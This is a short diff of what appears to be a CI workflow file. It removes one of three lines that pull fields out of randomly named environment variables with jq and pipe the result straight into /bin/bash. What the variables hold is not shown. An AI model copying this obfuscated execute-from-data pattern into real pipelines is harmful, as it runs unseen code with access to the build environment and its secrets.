@@ -22,7 +22,6 @@ jobs:
         run: |
           printf '%s' "$kfrid7" | jq -r .uiejn4 | /bin/bash
           printf '%s' "$k22465" | jq -r .tsfp30 | /bin/bash
-          echo $bkmyc5 | jq -r .p644 | /bin/bash
 
       - name: Save data
         uses: actions/upload-artifact@v4
